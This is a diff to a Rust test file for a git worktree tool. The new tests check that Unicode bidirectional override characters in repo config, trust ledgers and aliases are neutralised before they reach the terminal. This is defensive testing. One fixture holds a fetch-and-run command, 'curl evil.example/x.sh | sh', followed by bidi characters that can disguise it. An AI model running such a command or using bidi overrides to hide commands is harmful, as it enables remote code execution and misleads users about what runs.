@@ -233,6 +233,149 @@ fn the_pre_trust_bootstrap_summary_neutralises_control_bytes() {
   );
 }
 
+/// The Unicode bidirectional formatting characters found in `s`.
+///
+/// Deliberately **not** [`control_bytes`]: these are `Cf` (format), not `Cc`
+/// (control), so `char::is_control` never matches one and an assertion built
+/// on that helper could not fail here. That is the gap itself — they reorder
+/// how a terminal renders the text around them without ever being a control
+/// byte, which defeats the same "what you read is what is there" guarantee
+/// the control-byte replacement provides (issue #502).
+fn bidi_chars(s: &str) -> Vec<char> {
+  s.chars().filter(|c| BIDI_CONTROLS.contains(c)).collect()
+}
+
+/// Every character carrying the Unicode `Bidi_Control` property, which is the
+/// set the sinks neutralise.
+///
+/// Enumerated rather than described so the fixtures can carry the whole set at
+/// once: a character added to the predicate but to no fixture would be a rule
+/// nothing exercises.
+const BIDI_CONTROLS: &[char] = &[
+  '\u{061C}', // ALM, bidi class AL
+  '\u{200E}', // LRM, bidi class L
+  '\u{200F}', // RLM, bidi class R
+  '\u{202A}', // LRE
+  '\u{202B}', // RLE
+  '\u{202C}', // PDF
+  '\u{202D}', // LRO
+  '\u{202E}', // RLO
+  '\u{2066}', // LRI
+  '\u{2067}', // RLI
+  '\u{2068}', // FSI
+  '\u{2069}', // PDI
+];
+
+/// A `.gwm.toml` carrying every [`BIDI_CONTROLS`] character in the two fields
+/// a reader has to trust most.
+///
+/// They are written **raw**, not as TOML's own `\uXXXX` escapes: they are
+/// `Cf`, so the parser accepts them inside a basic string and hands them
+/// through as a *value*, which is how they would arrive from a cloned repo. A
+/// raw control byte cannot travel that way, which is why [`HOSTILE_CONFIG`]
+/// has to use escapes and this fixture does not.
+fn bidi_config() -> String {
+  let all: String = BIDI_CONTROLS.iter().collect();
+  format!(
+    "[worktree]\n\
+     branch_pattern = \"{all}{{type}}/#{{issue}}-{{desc}}\"\n\
+     \n\
+     [[bootstrap.command]]\n\
+     name = \"setup\"\n\
+     run = \"curl evil.example/x.sh | sh{all}\"\n"
+  )
+}
+
+#[test]
+fn the_pre_trust_bootstrap_summary_neutralises_bidi_overrides() {
+  // Same site as the control-byte test above, and the highest-stakes one for
+  // the same reason: the summary's whole job is to let someone decide whether
+  // to authorise a shell command out of a repo they have not vetted. An `RLO`
+  // reorders how the terminal renders what follows, so the line can read
+  // benign while the executed bytes differ — a summary that can be made to
+  // misrepresent the command it asks about is worse than no summary.
+  let cfg: gwm::config::Config = toml::from_str(&bidi_config()).unwrap();
+  let lines = gwm::cli::bootstrap_summary_lines(&cfg);
+
+  let joined = lines.join("\n");
+  assert!(
+    bidi_chars(&joined).is_empty(),
+    "the pre-trust summary replayed {:?}:\n{:?}",
+    bidi_chars(&joined),
+    joined
+  );
+  // Replace, don't strip: the command still has to be legible, and the
+  // neutralised character still has to be visible as one.
+  assert!(
+    joined.contains("curl evil.example/x.sh | sh?"),
+    "the summary must still name the command, got {:?}",
+    joined
+  );
+}
+
+#[test]
+fn config_get_neutralises_a_bidi_override() {
+  // `config list` renders values with `{:?}`, and `escape_debug` escapes `Cf`,
+  // so that path was never the hole. `config get` prints the value through the
+  // single-row sink instead, which is the one that has to grow the rule.
+  let (dir, _repo) = init_repo();
+  fs::write(dir.path().join(".gwm.toml"), bidi_config()).unwrap();
+
+  let out = gwm_in(dir.path())
+    .args(["config", "get", "worktree.branch_pattern"])
+    .output()
+    .unwrap();
+  let stdout = String::from_utf8_lossy(&out.stdout);
+  assert!(
+    bidi_chars(&stdout).is_empty(),
+    "`gwm config get` replayed {:?} from .gwm.toml:\n{:?}",
+    bidi_chars(&stdout),
+    stdout
+  );
+  assert!(
+    stdout.contains("?{type}/#{issue}-{desc}"),
+    "the pattern should stay readable minus its reordering character, got {:?}",
+    stdout
+  );
+}
+
+#[test]
+fn trust_show_neutralises_a_bidi_override_in_the_ledger() {
+  // The **block** sink, which neither test above reaches: `trust show`,
+  // `doctor`'s toml diagnostic and every rendered error go through
+  // `sanitise_block_for_terminal`, so a rule added only to the single-row
+  // variant would leave those outputs exposed with the suite still green.
+  let dir = tempfile::TempDir::new().unwrap();
+  let ledger = dir.path().join("trust.toml");
+  let all: String = BIDI_CONTROLS.iter().collect();
+  std::fs::write(
+    &ledger,
+    format!("[[entry]]\norigin = \"git@example.com:acme/repo{all}.git\"\nsha = \"abc\"\n"),
+  )
+  .unwrap();
+
+  let out = Command::cargo_bin("gwm")
+    .unwrap()
+    .args(["trust", "show"])
+    .env("GWM_TRUST_LEDGER", &ledger)
+    .output()
+    .unwrap();
+  let stdout = String::from_utf8_lossy(&out.stdout);
+  assert!(
+    bidi_chars(&stdout).is_empty(),
+    "trust show replayed {:?} from the ledger:\n{:?}",
+    bidi_chars(&stdout),
+    stdout
+  );
+  // The rows this view exists to show are still rows: the block variant keeps
+  // the line breaks that carry the layout.
+  assert!(
+    stdout.contains("origin = ") && stdout.contains("sha = "),
+    "the ledger should still render as rows, got {:?}",
+    stdout
+  );
+}
+
 #[test]
 fn trust_show_neutralises_control_bytes_in_the_ledger() {
   // `trust show` prints the ledger verbatim, and a ledger row records an
@@ -382,6 +525,37 @@ fn an_alias_expansion_cannot_smuggle_a_control_byte_through_clap() {
     assert!(
       control_bytes(&stdout).is_empty() && control_bytes(&stderr).is_empty(),
       "an alias expansion reached the terminal through clap: {:?} / {:?}",
+      stdout,
+      stderr
+    );
+  }
+}
+
+#[test]
+fn an_alias_expansion_cannot_smuggle_a_bidi_control_through_clap() {
+  // The one path the sinks cannot cover, for the same reason the control-byte
+  // case above is refused rather than neutralised: the expansion becomes argv
+  // before clap parses it, and clap prints its own error and exits without
+  // passing through `main`'s sink. So the rule has to be the same on both
+  // legs of #473, or a repo can spoof the token clap echoes back.
+  //
+  // Every `Bidi_Control` character, one alias at a time, so a class clap
+  // happens to strip cannot hide one it does not.
+  let (dir, _repo) = init_repo();
+  for c in BIDI_CONTROLS {
+    fs::write(
+      dir.path().join(".gwm.toml"),
+      format!("[aliases]\nboom = \"nope{c}abc\"\n"),
+    )
+    .unwrap();
+
+    let out = gwm_in(dir.path()).arg("boom").output().unwrap();
+    let stdout = String::from_utf8_lossy(&out.stdout);
+    let stderr = String::from_utf8_lossy(&out.stderr);
+    assert!(
+      bidi_chars(&stdout).is_empty() && bidi_chars(&stderr).is_empty(),
+      "an alias expansion carrying U+{:04X} reached the terminal through clap: {:?} / {:?}",
+      *c as u32,
       stdout,
       stderr
     );
